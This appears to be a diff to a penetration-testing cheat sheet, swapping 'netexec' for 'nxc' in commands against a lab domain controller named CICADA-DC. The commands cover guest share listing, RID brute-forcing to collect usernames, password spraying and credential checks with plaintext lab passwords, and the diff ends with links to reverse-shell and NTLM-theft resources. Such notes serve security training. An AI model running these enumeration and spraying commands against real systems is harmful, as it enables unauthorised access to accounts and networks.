@@ -212,9 +212,9 @@ enum4linux -a 10.10.10.161
 
 Netexec / Crackmapexec
 ```bash
-netexec smb CICADA-DC -u guest -p '' --shares                                                                                                                             
-netexec smb CICADA-DC -u guest -p '' --rid-brute                                                                                                                            #to brute force user ids from 0 to 4000
-netexec smb CICADA-DC -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | tee users.txt                                     #to cut users only
+nxc smb CICADA-DC -u guest -p '' --shares                                                                                                                             
+nxc smb CICADA-DC -u guest -p '' --rid-brute                                                                                                                            #to brute force user ids from 0 to 4000
+nxc smb CICADA-DC -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | tee users.txt                                     #to cut users only
 ```
 
 Password spray
@@ -224,9 +224,9 @@ netexec smb CICADA-DC -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-s
 
 To Validate Creds
 ```bash
-netexec smb CICADA-DC -u david.orelious -p 'aRt$Lp#7t*VQ!3'
-netexec ldap CICADA-DC -u david.orelious -p 'aRt$Lp#7t*VQ!3'
-netexec winrm CICADA-DC -u david.orelious -p 'aRt$Lp#7t*VQ!3'
+nxc smb CICADA-DC -u david.orelious -p 'aRt$Lp#7t*VQ!3'
+nxc ldap CICADA-DC -u david.orelious -p 'aRt$Lp#7t*VQ!3'
+nxc winrm CICADA-DC -u david.orelious -p 'aRt$Lp#7t*VQ!3'
 nxc rdp ip172.txt -u 'yoshi' -p 'Mushroom!'                                     
 ```
 
@@ -1020,5 +1020,6 @@ https://github.com/Greenwolf/ntlm_theft
 https://github.com/AtvikSecurity/CentralizedPotatoes
 https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 https://github.com/saisathvik1/OSCP-Cheatsheet
+
 
 
